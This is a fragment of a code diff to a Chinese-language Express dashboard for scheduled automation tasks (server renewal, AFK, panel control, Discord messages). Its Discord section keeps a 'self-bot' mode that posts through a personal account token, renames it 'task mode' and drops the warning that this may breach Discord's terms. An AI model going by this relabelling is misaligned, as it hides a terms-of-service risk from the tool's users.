-                if (cookieInput) {
-                    cookieInput.value = data.cookie;
-                    
-                    const card = document.getElementById(\`card-\${id}\`);
-                    const similarityText = card.querySelector('.cookie-similarity-text');
-                    const similarityIndicator = card.querySelector('.cookie-similarity-indicator');
-                    
-                    if (similarityText && similarityIndicator) {
-                        similarityText.innerText = \`相似度: \${data.similarity || '检测中'}\`;
-                        if (data.similarity) {
-                            const similarityPercent = parseInt(data.similarity) || 0;
-                            if (similarityPercent >= 90) {
-                                similarityIndicator.className = 'similarity-indicator similarity-good';
-                                similarityText.className = 'cookie-similarity-text text-[9px] text-emerald-400';
-                            } else if (similarityPercent >= 70) {
-                                similarityIndicator.className = 'similarity-indicator similarity-warning';
-                                similarityText.className = 'cookie-similarity-text text-[9px] text-yellow-400';
-                            } else {
-                                similarityIndicator.className = 'similarity-indicator similarity-bad';
-                                similarityText.className = 'cookie-similarity-text text-[9px] text-red-400';
-                            }
-                        }
-                    }
-                }
-                await updateUI();
-            }
-        } catch (err) {
-        } finally {
-            btn.innerText = oldText;
-            btn.disabled = false;
-        }
     }
     
     async function savePto(id) { 
@@ -5101,6 +5095,7 @@ app.get('/dashboard', requireAuth, (req, res) => {
         \`;
         
         switch(type) {
+            // 在 dashboard 的 script 标签内找到此函数
             case 'renew':
                 html = \`
                     <div class="space-y-4">
@@ -5110,17 +5105,18 @@ app.get('/dashboard', requireAuth, (req, res) => {
                                    placeholder="https://example.com/renew" required value="\${task?.config?.renewUrl || ''}">
                         </div>
                         <div>
-                            <label class="block text-sm text-slate-400 mb-1">续期方式</label>
+                            <label class="block text-sm text-slate-400 mb-1">请求方法</label>
                             <select id="renew-method" class="w-full px-3 py-2 bg-slate-800 border border-slate-700 rounded-lg text-sm">
-                                <option value="auto" \${task?.config?.method === 'auto' ? 'selected' : ''}>自动续期</option>
-                                <option value="manual" \${task?.config?.method === 'manual' ? 'selected' : ''}>手动确认</option>
+                                <option value="POST">POST (推荐)</option>
+                                <option value="GET">GET</option>
+                                <option value="PUT">PUT</option>
                             </select>
                         </div>
                         \${commonLoginFields}
                     </div>
                 \`;
                 break;
-                
+                    
             case 'afk':
                 html = \`
                     <div class="space-y-4">
@@ -5223,129 +5219,86 @@ app.get('/dashboard', requireAuth, (req, res) => {
                 break;
                 
             case 'discord':
-                html = \`
-                    <div class="space-y-4">
-                        <div>
-                            <label class="block text-sm text-slate-400 mb-1">消息内容 *</label>
-                            <textarea id="discord-message" rows="3" class="w-full px-3 py-2 bg-slate-800 border border-slate-700 rounded-lg text-sm" 
-                                      placeholder="输入要发送的Discord消息内容" required>\${task?.config?.message || ''}</textarea>
-                        </div>
-                        
-                        <div class="login-config-section">
-                            <h4 class="text-sm font-bold text-slate-300 mb-2">发送方式配置</h4>
-                            <div class="space-y-3">
-                                <div>
-                                    <label class="block text-xs text-slate-400 mb-1">Discord Webhook URL（传统方式）</label>
-                                    <input id="discord-webhook" type="url" class="w-full px-3 py-1.5 bg-slate-800 border border-slate-700 rounded-lg text-sm" 
-                                           placeholder="https://discord.com/api/webhooks/..." value="\${task?.config?.discordWebhookUrl || ''}">
-                                    <p class="text-xs text-slate-500 mt-1">从Discord频道设置中获取Webhook URL</p>
-                                </div>
-                                
-                                <div class="border-t border-slate-700 pt-3">
-                                    <div class="flex items-center gap-2 mb-2">
-                                        <input id="discord-selfbot-mode" type="checkbox" \${task?.config?.discordSelfBotMode ? 'checked' : ''}>
-                                        <label class="text-sm text-slate-300 font-medium">启用 Self-bot 模式</label>
-                                    </div>
-                                    <p class="text-xs text-slate-500 mb-3">Self-bot使用个人账户Token直接发送消息，需要频道ID</p>
-                                    
-                                    <div id="selfbot-config" class="space-y-2 \${task?.config?.discordSelfBotMode ? '' : 'hidden'}">
-                                        <div>
-                                            <label class="block text-xs text-slate-400 mb-1">Self-bot Token</label>
-                                            <input id="discord-selfbot-token" type="password" class="w-full px-3 py-1.5 bg-slate-800 border border-slate-700 rounded-lg text-sm" 
-                                                   placeholder="个人账户Token（开发者工具获取）" value="\${task?.config?.discordSelfBotToken ? '********' : ''}">
-                                            <p class="text-xs text-slate-500 mt-1">⚠️ 使用Self-bot可能违反Discord服务条款</p>
-                                        </div>
-                                        <div>
-                                            <label class="block text-xs text-slate-400 mb-1">频道ID</label>
-                                            <input id="discord-channel-id" type="text" class="w-full px-3 py-1.5 bg-slate-800 border border-slate-700 rounded-lg text-sm" 
-                                                   placeholder="频道ID（右键频道复制ID）" value="\${task?.config?.discordChannelId || ''}">
-                                        </div>
-                                    </div>
-                                    
-                                    <div class="text-xs text-slate-500 bg-slate-900/50 p-2 rounded border border-slate-700">
-                                        <p class="font-medium mb-1">配置说明：</p>
-                                        <p>1. 传统方式：填写Webhook URL即可，不需要Token和频道ID</p>
-                                        <p>2. Self-bot方式：需要个人账户Token和频道ID</p>
-                                        <p>3. 优先使用Self-bot方式（如果启用）</p>
-                                    </div>
-                                </div>
-                                
-                                <div class="grid grid-cols-2 gap-2">
-                                    <div>
-                                        <label class="block text-xs text-slate-400 mb-1">发送者名称</label>
-                                        <input id="discord-username" type="text" class="w-full px-3 py-1.5 bg-slate-800 border border-slate-700 rounded-lg text-sm" 
-                                               placeholder="发送者显示名称" value="\${task?.config?.discordUsername || ''}">
-                                    </div>
-                                    <div>
-                                        <label class="block text-xs text-slate-400 mb-1">头像URL</label>
-                                        <input id="discord-avatar" type="url" class="w-full px-3 py-1.5 bg-slate-800 border border-slate-700 rounded-lg text-sm" 
-                                               placeholder="头像图片URL" value="\${task?.config?.discordAvatarUrl || ''}">
-                                    </div>
-                                </div>
-                            </div>
-                        </div>
+    html = \`
+        <div class="space-y-4">
+            <div>
+                <label class="block text-sm text-slate-400 mb-1">消息内容 *</label>
+                <textarea id="discord-message" rows="3" class="w-full px-3 py-2 bg-slate-800 border border-slate-700 rounded-lg text-sm" 
+                          placeholder="输入要发送的Discord消息内容" required>\${task?.config?.message || ''}</textarea>
+            </div>
+            
+            <div class="login-config-section">
+                <h4 class="text-sm font-bold text-slate-300 mb-2">发送方式配置</h4>
+                <div class="space-y-3">
+                    <div>
+                        <label class="block text-xs text-slate-400 mb-1">Discord Webhook URL（推荐方式）</label>
+                        <input id="discord-webhook" type="url" value="\${task?.config?.discordWebhookUrl || ''}" 
+                               class="w-full px-3 py-1.5 bg-slate-800 border border-slate-700 rounded-lg text-sm" 
+                               placeholder="https://discord.com/api/webhooks/...">
+                        <p class="text-xs text-slate-500 mt-1">从Discord频道设置中获取Webhook URL</p>
                     </div>
-                \`;
-                
-                // 为Discord Self-bot模式添加切换事件
-                setTimeout(() => {
-                    const selfbotCheckbox = document.getElementById('discord-selfbot-mode');
-                    const selfbotConfig = document.getElementById('selfbot-config');
-                    if (selfbotCheckbox && selfbotConfig) {
-                        selfbotCheckbox.addEventListener('change', function() {
-                            selfbotConfig.classList.toggle('hidden', !this.checked);
-                        });
-                    }
-                }, 100);
-                break;
-
-            // 新增：网页自定义点击配置
-            case 'web-click':
-                html = \`
-                    <div class="space-y-4">
-                        <div>
-                            <label class="block text-sm text-slate-400 mb-1">目标网址 *</label>
-                            <input id="target-url" type="url" class="w-full px-3 py-2 bg-slate-800 border border-slate-700 rounded-lg text-sm" 
-                                   placeholder="https://example.com/dashboard (登录后导航至此)" required value="\${task?.config?.targetUrl || ''}">
+                    
+                    <div class="border-t border-slate-700 pt-3">
+                        <div class="flex items-center gap-2 mb-2">
+                            <input id="discord-selfbot-mode" type="checkbox" \${task?.config?.discordSelfBotMode ? 'checked' : ''}>
+                            <label class="text-sm text-slate-300 font-medium">启用任务模式</label>
                         </div>
+                        <p class="text-xs text-slate-500 mb-3">任务模式使用个人 Token 直接发送消息，需要频道 ID</p>
                         
-                        <div class="login-config-section">
-                            <h4 class="text-sm font-bold text-slate-300 mb-2">登录凭据（用于自动登录）</h4>
-                            <div class="space-y-2">
-                                <div>
-                                    <label class="block text-xs text-slate-400 mb-1">登录地址 (URL)</label>
-                                    <input id="login-url" type="url" class="w-full px-3 py-1.5 bg-slate-800 border border-slate-700 rounded-lg text-sm" 
-                                           placeholder="https://example.com/login" value="\${task?.config?.loginUrl || ''}">
-                                </div>
-                                <div class="grid grid-cols-2 gap-2">
-                                    <div>
-                                        <label class="block text-xs text-slate-400 mb-1">用户名</label>
-                                        <input id="login-username" type="text" class="w-full px-3 py-1.5 bg-slate-800 border border-slate-700 rounded-lg text-sm" 
-                                               placeholder="用户名" value="\${task?.config?.username || ''}">
-                                    </div>
-                                    <div>
-                                        <label class="block text-xs text-slate-400 mb-1">密码</label>
-                                        <input id="login-password" type="password" class="w-full px-3 py-1.5 bg-slate-800 border border-slate-700 rounded-lg text-sm" 
-                                               placeholder="密码" value="\${task?.config?.password ? '********' : ''}">
-                                    </div>
-                                </div>
-                                <div>
-                                    <label class="block text-xs text-slate-400 mb-1">Cookie（可选，如果有则不登录）</label>
-                                    <textarea id="login-cookie" rows="2" class="w-full px-3 py-1.5 bg-slate-800 border border-slate-700 rounded-lg text-sm" 
-                                              placeholder="session=xxx; token=yyy">\${task?.config?.cookie || ''}</textarea>
-                                </div>
+                        <div id="selfbot-config" class="space-y-2 \${task?.config?.discordSelfBotMode ? '' : 'hidden'}">
+                            <div>
+                                <label class="block text-xs text-slate-400 mb-1">个人 Token</label>
+                                <input id="discord-selfbot-token" type="password" value="\${task?.config?.discordSelfBotToken ? '********' : ''}" 
+                                       class="w-full px-3 py-1.5 bg-slate-800 border border-slate-700 rounded-lg text-sm" 
+                                       placeholder="输入Token">
+                                <p class="text-xs text-slate-500 mt-1">⚠️ 请妥善保管 Token，避免泄露</p>
+                            </div>
+                            <div>
+                                <label class="block text-xs text-slate-400 mb-1">频道 ID</label>
+                                <input id="discord-channel-id" type="text" value="\${task?.config?.discordChannelId || ''}" 
+                                       class="w-full px-3 py-1.5 bg-slate-800 border border-slate-700 rounded-lg text-sm" 
+                                       placeholder="输入频道ID">
                             </div>
                         </div>
                         
-                        <div>
-                            <label class="block text-sm text-slate-400 mb-1">按钮特征词 *</label>
-                            <input id="button-text" type="text" class="w-full px-3 py-2 bg-slate-800 border border-slate-700 rounded-lg text-sm" 
-                                   placeholder="例如: Reset Time, Submit, 确认提交 (支持智能模糊匹配)" required value="\${task?.config?.buttonText || ''}">
-                            <p class="text-xs text-slate-500 mt-1">输入 "reset" 可以匹配 "Reset Time"</p>
+                        <div class="grid grid-cols-2 gap-2">
+                            <div>
+                                <label class="block text-xs text-slate-400 mb-1">发送者名称</label>
+                                <input id="discord-username" type="text" value="\${task?.config?.discordUsername || ''}" 
+                                       class="w-full px-3 py-1.5 bg-slate-800 border border-slate-700 rounded-lg text-sm" 
+                                       placeholder="可选">
+                            </div>
+                            <div>
+                                <label class="block text-xs text-slate-400 mb-1">头像URL</label>
+                                <input id="discord-avatar" type="url" value="\${task?.config?.discordAvatarUrl || ''}" 
+                                       class="w-full px-3 py-1.5 bg-slate-800 border border-slate-700 rounded-lg text-sm" 
+                                       placeholder="可选">
+                            </div>
                         </div>
                     </div>
-                \`;
-                break;
+                    
+                    <div class="text-xs text-slate-500 bg-slate-900/50 p-2 rounded border border-slate-700">
+                        <p class="font-medium mb-1">配置说明：</p>
+                        <p>1. 推荐方式：填写Webhook URL即可，不需要Token和频道ID</p>
+                        <p>2. 任务方式：需要个人 Token 和频道 ID</p>
+                        <p>3. 优先使用任务方式（如果启用）</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    \`;
+    
+    // 为Discord 任务模式添加切换事件
+    setTimeout(() => {
+        const selfbotCheckbox = document.getElementById('discord-selfbot-mode');
+        const selfbotConfig = document.getElementById('selfbot-config');
+        if (selfbotCheckbox && selfbotConfig) {
+            selfbotCheckbox.addEventListener('change', function() {
+                selfbotConfig.classList.toggle('hidden', !this.checked);
+            });
+        }
+    }, 100);
+    break;
         }
         
         container.innerHTML = html;
@@ -5389,13 +5342,15 @@ app.get('/dashboard', requireAuth, (req, res) => {
         
         switch(type) {
             case 'renew':
-                const renewUrl = document.getElementById('renew-url').value;
-                if (!renewUrl) {
+                const renewUrlInput = document.getElementById('renew-url');
+                const renewMethodInput = document.getElementById('renew-method'); // 确保能获取到新的下拉框
+            
+                if (!renewUrlInput || !renewUrlInput.value) {
                     alert('请输入续期URL');
                     return;
                 }
-                config.renewUrl = renewUrl;
-                config.method = document.getElementById('renew-method').value;
+                config.renewUrl = renewUrlInput.value;
+                config.method = renewMethodInput ? renewMethodInput.value : 'POST'; 
                 break;
             case 'afk':
                 const afkUrl = document.getElementById('afk-url').value;
@@ -5454,34 +5409,10 @@ app.get('/dashboard', requireAuth, (req, res) => {
                     return;
                 }
                 break;
-            
-            // 新增 Web Click 处理
-            case 'web-click':
-                const clickTargetUrl = document.getElementById('target-url').value;
-                const clickButtonText = document.getElementById('button-text').value;
-                
-                if (!clickTargetUrl) {
-                    alert('请输入目标网址');
-                    return;
-                }
-                if (!clickButtonText) {
-                    alert('请输入按钮特征词');
-                    return;
-                }
-
-                config.targetUrl = clickTargetUrl;
-                config.buttonText = clickButtonText;
-                
-                // 登录信息收集
-                config.loginUrl = document.getElementById('login-url').value;
-                config.username = document.getElementById('login-username').value;
-                config.password = document.getElementById('login-password').value;
-                config.cookie = document.getElementById('login-cookie').value;
-                break;
         }
         
         // 收集登录配置（如果有的话）
-        if (type !== 'pteranodon' && type !== 'discord' && type !== 'web-click') {
+        if (type !== 'pteranodon' && type !== 'discord') {
             const loginUrl = document.getElementById('login-url')?.value;
             const username = document.getElementById('login-username')?.value;
             const password = document.getElementById('login-password')?.value;
@@ -5555,7 +5486,6 @@ app.get('/dashboard', requireAuth, (req, res) => {
             'afk': 'AFK',
             'pteranodon': 'Pteranodon',
             'discord': 'Discord',
-            'web-click': '网页点击',
             'timed-url': '访问URL'
         };
 
@@ -5586,13 +5516,21 @@ app.get('/dashboard', requireAuth, (req, res) => {
         \`).join('');
     }
     
-    // 选择任务
+    // 选择任务 (修改版：点击已选中任务则取消/返回)
     function selectTask(taskId) {
+        // 【新增逻辑】如果点击的是当前已经选中的任务，则取消选中
+        if (selectedTaskId === taskId) {
+            selectedTaskId = null; // 清空选中ID
+            resetTaskDetail(); // 重置右侧面板为空
+            renderTaskList(taskCenterData.tasks); // 更新左侧列表样式（去掉高亮）
+            return; // 提前结束，不执行后续逻辑
+        }
+
+        // 【原有逻辑】选中新任务
         selectedTaskId = taskId;
-        renderTaskList(taskCenterData.tasks);
-        loadTaskDetail(taskId);
+        renderTaskList(taskCenterData.tasks); // 高亮左侧列表
+        loadTaskDetail(taskId); // 加载右侧详情（此时所有表单均可修改）);
     }
-    
     // 加载任务详情
     async function loadTaskDetail(taskId) {
         try {
@@ -5672,7 +5610,7 @@ app.get('/dashboard', requireAuth, (req, res) => {
                                                           task.type === 'afk' ? 'AFK任务' : 
                                                           task.type === 'pteranodon' ? 'Pteranodon控制' : 
                                                           task.type === 'discord' ? 'Discord消息' : 
-                                                          task.type === 'web-click' ? '网页自定义点击' : '定时访问URL';
+                                                          '定时访问URL';
         
         // 设置定时输入框
         document.getElementById('task-config-minutes').value = task.config.minutes || 0;
@@ -5736,253 +5674,90 @@ app.get('/dashboard', requireAuth, (req, res) => {
                                    onchange="updateTaskConfig('\${task.id}', 'renewUrl', this.value)">
                         </div>
                         <div>
-                            <label class="block text-sm text-slate-400 mb-1">续期方式</label>
+                            <label class="block text-sm text-slate-400 mb-1">请求方法</label>
                             <select class="w-full px-3 py-2 bg-slate-800 border border-slate-700 rounded-lg text-sm" 
                                     onchange="updateTaskConfig('\${task.id}', 'method', this.value)">
-                                <option value="auto" \${task.config.method === 'auto' ? 'selected' : ''}>自动续期</option>
-                                <option value="manual" \${task.config.method === 'manual' ? 'selected' : ''}>手动确认</option>
+                                <option value="POST" \${task.config.method === 'POST' ? 'selected' : ''}>POST</option>
+                                <option value="GET" \${task.config.method === 'GET' ? 'selected' : ''}>GET</option>
+                                <option value="PUT" \${task.config.method === 'PUT' ? 'selected' : ''}>PUT</option>
                             </select>
-                        </div>
-                    </div>
-                \`;
-                break;
-                
-            case 'afk':
-                html = \`
-                    <div class="space-y-4">
-                        <div>
-                            <label class="block text-sm text-slate-400 mb-1">挂机网址</label>
-                            <input type="text" value="\${task.config.afkUrl || ''}" 
-                                   class="w-full px-3 py-2 bg-slate-800 border border-slate-700 rounded-lg text-sm" 
-                                   onchange="updateTaskConfig('\${task.id}', 'afkUrl', this.value)">
-                        </div>
-                        <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
-                            <div>
-                                <label class="block text-sm text-slate-400 mb-1">AFK时长(分钟)</label>
-                                <input type="number" min="1" value="\${task.config.duration || 30}" 
-                                       class="w-full px-3 py-2 bg-slate-800 border border-slate-700 rounded-lg text-sm" 
-                                       onchange="updateTaskConfig('\${task.id}', 'duration', this.value)">
-                            </div>
-                            <div>
-                                <label class="block text-sm text-slate-400 mb-1">AFK动作</label>
-                                <select class="w-full px-3 py-2 bg-slate-800 border border-slate-700 rounded-lg text-sm" 
-                                        onchange="updateTaskConfig('\${task.id}', 'action', this.value)">
-                                    <option value="simulate" \${task.config.action === 'simulate' ? 'selected' : ''}>模拟活动</option>
-                                    <option value="notification" \${task.config.action === 'notification' ? 'selected' : ''}>发送通知</option>
-                                    <option value="auto-login" \${task.config.action === 'auto-login' ? 'selected' : ''}>自动登录保持</option>
-                                </select>
-                            </div>
-                        </div>
-                    </div>
-                \`;
-                break;
-                
-            case 'timed-url':
-                html = \`
-                    <div class="space-y-4">
-                        <div>
-                            <label class="block text-sm text-slate-400 mb-1">目标URL</label>
-                            <input type="text" value="\${task.config.targetUrl || ''}" 
-                                   class="w-full px-3 py-2 bg-slate-800 border border-slate-700 rounded-lg text-sm" 
-                                   onchange="updateTaskConfig('\${task.id}', 'targetUrl', this.value)">
-                        </div>
-                        <div>
-                            <label class="block text-sm text-slate-400 mb-1">访问方式</label>
-                            <select class="w-full px-3 py-2 bg-slate-800 border border-slate-700 rounded-lg text-sm" 
-                                    onchange="updateTaskConfig('\${task.id}', 'method', this.value)">
-                                <option value="get" \${task.config.method === 'get' ? 'selected' : ''}>GET请求</option>
-                                <option value="post" \${task.config.method === 'post' ? 'selected' : ''}>POST请求</option>
-                                <option value="simulate" \${task.config.method === 'simulate' ? 'selected' : ''}>模拟浏览器</option>
-                                <option value="with-login" \${task.config.method === 'with-login' ? 'selected' : ''}>带登录访问</option>
-                            </select>
-                        </div>
-                    </div>
-                \`;
-                break;
-                
-            case 'pteranodon':
-                html = \`
-                    <div class="space-y-4">
-                        <div>
-                            <label class="block text-sm text-slate-400 mb-1">Pteranodon URL</label>
-                            <input type="text" value="\${task.config.url || ''}" 
-                                   class="w-full px-3 py-2 bg-slate-800 border border-slate-700 rounded-lg text-sm" 
-                                   onchange="updateTaskConfig('\${task.id}', 'url', this.value)">
-                        </div>
-                        <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
-                            <div>
-                                <label class="block text-sm text-slate-400 mb-1">API Key</label>
-                                <input type="password" value="\${task.config.apiKey ? '********' : ''}" 
-                                       class="w-full px-3 py-2 bg-slate-800 border border-slate-700 rounded-lg text-sm" 
-                                       onchange="updateTaskConfig('\${task.id}', 'apiKey', this.value)">
-                            </div>
-                            <div>
-                                <label class="block text-sm text-slate-400 mb-1">服务器ID</label>
-                                <input type="text" value="\${task.config.serverId || ''}" 
-                                       class="w-full px-3 py-2 bg-slate-800 border border-slate-700 rounded-lg text-sm" 
-                                       onchange="updateTaskConfig('\${task.id}', 'serverId', this.value)">
-                            </div>
-                        </div>
-                        <div>
-                            <label class="block text-sm text-slate-400 mb-1">默认操作</label>
-                            <select class="w-full px-3 py-2 bg-slate-800 border border-slate-700 rounded-lg text-sm" 
-                                    onchange="updateTaskConfig('\${task.id}', 'action', this.value)">
-                                <option value="start" \${task?.config?.action === 'start' ? 'selected' : ''}>启动</option>
-                                <option value="restart" \${task?.config?.action === 'restart' ? 'selected' : ''}>重启</option>
-                                <option value="stop" \${task?.config?.action === 'stop' ? 'selected' : ''}>停止</option>
-                                <option value="status" \${task?.config?.action === 'status' ? 'selected' : ''}>状态检查</option>
-                                <option value="renew" \${task?.config?.action === 'renew' ? 'selected' : ''}>续期</option>
-                            </select>
-                        </div>
-                        <div class="login-config-section">
-                            <h4 class="text-sm font-bold text-slate-300 mb-2">续期配置</h4>
-                            <div class="space-y-2">
-                                <div class="flex items-center gap-2">
-                                    <input type="checkbox" \${task.config.renewEnabled ? 'checked' : ''} 
-                                           onchange="updateTaskConfig('\${task.id}', 'renewEnabled', this.checked)">
-                                    <label class="text-sm text-slate-400">启用续期功能</label>
-                                </div>
-                                <div>
-                                    <label class="block text-xs text-slate-400 mb-1">续期URL</label>
-                                    <input type="text" value="\${task.config.renewUrl || ''}" 
-                                           class="w-full px-3 py-1.5 bg-slate-800 border border-slate-700 rounded-lg text-sm" 
-                                           onchange="updateTaskConfig('\${task.id}', 'renewUrl', this.value)">
-                                </div>
-                                <div>
-                                    <label class="block text-xs text-slate-400 mb-1">续期Cookie</label>
-                                    <textarea rows="2" class="w-full px-3 py-1.5 bg-slate-800 border border-slate-700 rounded-lg text-sm" 
-                                              onchange="updateTaskConfig('\${task.id}', 'renewCookie', this.value)">\${task.config.renewCookie || ''}</textarea>
-                                </div>
-                            </div>
                         </div>
                     </div>
                 \`;
                 break;
                 
             case 'discord':
-                html = \`
-                    <div class="space-y-4">
-                        <div>
-                            <label class="block text-sm text-slate-400 mb-1">消息内容</label>
-                            <textarea rows="3" class="w-full px-3 py-2 bg-slate-800 border border-slate-700 rounded-lg text-sm" 
-                                      onchange="updateTaskConfig('\${task.id}', 'message', this.value)">\${task.config.message || ''}</textarea>
-                        </div>
-                        
-                        <div class="login-config-section">
-                            <h4 class="text-sm font-bold text-slate-300 mb-2">发送方式配置</h4>
-                            <div class="space-y-3">
-                                <div>
-                                    <label class="block text-xs text-slate-400 mb-1">Discord Webhook URL</label>
-                                    <input type="url" value="\${task.config.discordWebhookUrl || ''}" 
-                                           class="w-full px-3 py-1.5 bg-slate-800 border border-slate-700 rounded-lg text-sm" 
-                                           onchange="updateTaskConfig('\${task.id}', 'discordWebhookUrl', this.value)">
-                                </div>
-                                
-                                <div class="border-t border-slate-700 pt-3">
-                                    <div class="flex items-center gap-2 mb-2">
-                                        <input type="checkbox" \${task.config.discordSelfBotMode ? 'checked' : ''}
-                                               onchange="updateTaskConfig('\${task.id}', 'discordSelfBotMode', this.checked)">
-                                        <label class="text-sm text-slate-300 font-medium">启用 Self-bot 模式</label>
-                                    </div>
-                                    
-                                    <div id="selfbot-config-\${task.id}" class="space-y-2 \${task.config.discordSelfBotMode ? '' : 'hidden'}">
-                                        <div>
-                                            <label class="block text-xs text-slate-400 mb-1">Self-bot Token</label>
-                                            <input type="password" value="\${task.config.discordSelfBotToken ? '********' : ''}" 
-                                                   class="w-full px-3 py-1.5 bg-slate-800 border border-slate-700 rounded-lg text-sm" 
-                                                   onchange="updateTaskConfig('\${task.id}', 'discordSelfBotToken', this.value)">
-                                        </div>
-                                        <div>
-                                            <label class="block text-xs text-slate-400 mb-1">频道ID</label>
-                                            <input type="text" value="\${task.config.discordChannelId || ''}" 
-                                                   class="w-full px-3 py-1.5 bg-slate-800 border border-slate-700 rounded-lg text-sm" 
-                                                   onchange="updateTaskConfig('\${task.id}', 'discordChannelId', this.value)">
-                                        </div>
-                                    </div>
-                                    
-                                    <div class="grid grid-cols-2 gap-2 mt-2">
-                                        <div>
-                                            <label class="block text-xs text-slate-400 mb-1">发送者名称</label>
-                                            <input type="text" value="\${task.config.discordUsername || ''}" 
-                                                   class="w-full px-3 py-1.5 bg-slate-800 border border-slate-700 rounded-lg text-sm" 
-                                                   onchange="updateTaskConfig('\${task.id}', 'discordUsername', this.value)">
-                                        </div>
-                                        <div>
-                                            <label class="block text-xs text-slate-400 mb-1">头像URL</label>
-                                            <input type="url" value="\${task.config.discordAvatarUrl || ''}" 
-                                                   class="w-full px-3 py-1.5 bg-slate-800 border border-slate-700 rounded-lg text-sm" 
-                                                   onchange="updateTaskConfig('\${task.id}', 'discordAvatarUrl', this.value)">
-                                        </div>
-                                    </div>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                \`;
-                
-                // 为Discord Self-bot模式添加切换事件
-                setTimeout(() => {
-                    const selfbotCheckbox = document.querySelector(\`#selfbot-config-\${task.id} + div input[type="checkbox"]\`);
-                    const selfbotConfig = document.getElementById(\`selfbot-config-\${task.id}\`);
-                    if (selfbotCheckbox && selfbotConfig) {
-                        selfbotCheckbox.addEventListener('change', function() {
-                            selfbotConfig.classList.toggle('hidden', !this.checked);
-                        });
-                    }
-                }, 100);
-                break;
+    html = \`
+        <div class="space-y-4">
+            <div>
+                <label class="block text-sm text-slate-400 mb-1">消息内容</label>
+                <textarea rows="3" class="w-full px-3 py-2 bg-slate-800 border border-slate-700 rounded-lg text-sm" 
+                          onchange="updateTaskConfig('\${task.id}', 'message', this.value)">\${task.config.message || ''}</textarea>
+            </div>
             
-            // 新增 Web Click 详情配置
-            case 'web-click':
-                html = \`
-                    <div class="space-y-4">
-                        <div>
-                            <label class="block text-sm text-slate-400 mb-1">目标网址</label>
-                            <input type="text" value="\${task.config.targetUrl || ''}" 
-                                   class="w-full px-3 py-2 bg-slate-800 border border-slate-700 rounded-lg text-sm" 
-                                   onchange="updateTaskConfig('\${task.id}', 'targetUrl', this.value)">
+            <div class="login-config-section">
+                <h4 class="text-sm font-bold text-slate-300 mb-2">发送方式配置</h4>
+                <div class="space-y-3">
+                    <div>
+                        <label class="block text-xs text-slate-400 mb-1">Discord Webhook URL</label>
+                        <input type="url" value="\${task.config.discordWebhookUrl || ''}" 
+                               class="w-full px-3 py-1.5 bg-slate-800 border border-slate-700 rounded-lg text-sm" 
+                               onchange="updateTaskConfig('\${task.id}', 'discordWebhookUrl', this.value)">
+                    </div>
+                    
+                    <div class="border-t border-slate-700 pt-3">
+                        <div class="flex items-center gap-2 mb-2">
+                            <input type="checkbox" \${task.config.discordSelfBotMode ? 'checked' : ''}
+                                   onchange="updateTaskConfig('\${task.id}', 'discordSelfBotMode', this.checked)">
+                            <label class="text-sm text-slate-300 font-medium">启用任务模式</label>
                         </div>
                         
-                        <div class="login-config-section">
-                            <h4 class="text-sm font-bold text-slate-300 mb-2">登录凭据</h4>
-                            <div class="space-y-2">
-                                <div>
-                                    <label class="block text-xs text-slate-400 mb-1">登录URL</label>
-                                    <input type="text" value="\${task.config.loginUrl || ''}" 
-                                           class="w-full px-3 py-1.5 bg-slate-800 border border-slate-700 rounded-lg text-sm" 
-                                           onchange="updateTaskConfig('\${task.id}', 'loginUrl', this.value)">
-                                </div>
-                                <div class="grid grid-cols-2 gap-2">
-                                    <div>
-                                        <label class="block text-xs text-slate-400 mb-1">用户名</label>
-                                        <input type="text" value="\${task.config.username || ''}" 
-                                               class="w-full px-3 py-1.5 bg-slate-800 border border-slate-700 rounded-lg text-sm" 
-                                               onchange="updateTaskConfig('\${task.id}', 'username', this.value)">
-                                    </div>
-                                    <div>
-                                        <label class="block text-xs text-slate-400 mb-1">密码</label>
-                                        <input type="password" value="\${task.config.password ? '********' : ''}" 
-                                               class="w-full px-3 py-1.5 bg-slate-800 border border-slate-700 rounded-lg text-sm" 
-                                               onchange="updateTaskConfig('\${task.id}', 'password', this.value)">
-                                    </div>
-                                </div>
-                                <div>
-                                    <label class="block text-xs text-slate-400 mb-1">Cookie</label>
-                                    <textarea rows="2" class="w-full px-3 py-1.5 bg-slate-800 border border-slate-700 rounded-lg text-sm" 
-                                              onchange="updateTaskConfig('\${task.id}', 'cookie', this.value)">\${task.config.cookie || ''}</textarea>
-                                </div>
+                        <div id="selfbot-config-\${task.id}" class="space-y-2 \${task.config.discordSelfBotMode ? '' : 'hidden'}">
+                            <div>
+                                <label class="block text-xs text-slate-400 mb-1">个人 Token</label>
+                                <input type="password" value="\${task.config.discordSelfBotToken ? '********' : ''}" 
+                                       class="w-full px-3 py-1.5 bg-slate-800 border border-slate-700 rounded-lg text-sm" 
+                                       onchange="updateTaskConfig('\${task.id}', 'discordSelfBotToken', this.value)">
+                            </div>
+                            <div>
+                                <label class="block text-xs text-slate-400 mb-1">频道ID</label>
+                                <input type="text" value="\${task.config.discordChannelId || ''}" 
+                                       class="w-full px-3 py-1.5 bg-slate-800 border border-slate-700 rounded-lg text-sm" 
+                                       onchange="updateTaskConfig('\${task.id}', 'discordChannelId', this.value)">
                             </div>
                         </div>
                         
-                        <div>
-                            <label class="block text-sm text-slate-400 mb-1">按钮特征词</label>
-                            <input type="text" value="\${task.config.buttonText || ''}" 
-                                   class="w-full px-3 py-2 bg-slate-800 border border-slate-700 rounded-lg text-sm" 
-                                   onchange="updateTaskConfig('\${task.id}', 'buttonText', this.value)">
+                        <div class="grid grid-cols-2 gap-2 mt-2">
+                            <div>
+                                <label class="block text-xs text-slate-400 mb-1">发送者名称</label>
+                                <input type="text" value="\${task.config.discordUsername || ''}" 
+                                       class="w-full px-3 py-1.5 bg-slate-800 border border-slate-700 rounded-lg text-sm" 
+                                       onchange="updateTaskConfig('\${task.id}', 'discordUsername', this.value)">
+                            </div>
+                            <div>
+                                <label class="block text-xs text-slate-400 mb-1">头像URL</label>
+                                <input type="url" value="\${task.config.discordAvatarUrl || ''}" 
+                                       class="w-full px-3 py-1.5 bg-slate-800 border border-slate-700 rounded-lg text-sm" 
+                                       onchange="updateTaskConfig('\${task.id}', 'discordAvatarUrl', this.value)">
+                            </div>
                         </div>
                     </div>
-                \`;
-                break;
+                </div>
+            </div>
+        </div>
+    \`;
+    
+    // 为Discord 任务模式添加切换事件
+    setTimeout(() => {
+        const selfbotCheckbox = document.querySelector(\`#selfbot-config-\${task.id} + div input[type="checkbox"]\`);
